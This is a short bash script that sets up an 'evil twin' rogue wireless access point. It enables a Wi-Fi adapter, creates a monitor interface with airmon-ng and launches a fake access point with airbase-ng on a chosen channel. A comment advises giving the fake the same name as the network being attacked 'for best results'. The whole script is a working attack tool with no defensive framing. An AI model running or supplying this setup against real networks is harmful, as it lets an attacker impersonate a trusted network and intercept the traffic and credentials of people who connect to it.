#! /bin/bash

# this script sets up the evil twin access point

WLAN=wlan1			# monitor mode wirless adapter
MON=mon
WLANMON=$WLAN$MON
ESSID=zzzz
CHANNEL=11

# Enable the wireless adapter
echo -e "Enabled $WLAN"
ifconfig $WLAN up

# create the monitor network interface
echo -e "Creating $WLAN monitor interface"
airmon-ng start $WLAN

# start up the evil twin AP (access point)
# 	Give the evil twin the same name as the network you are attacking for best results
echo -e "starting evil twin"
airbase-ng -e $ESSID -c $CHANNEL $WLANMON
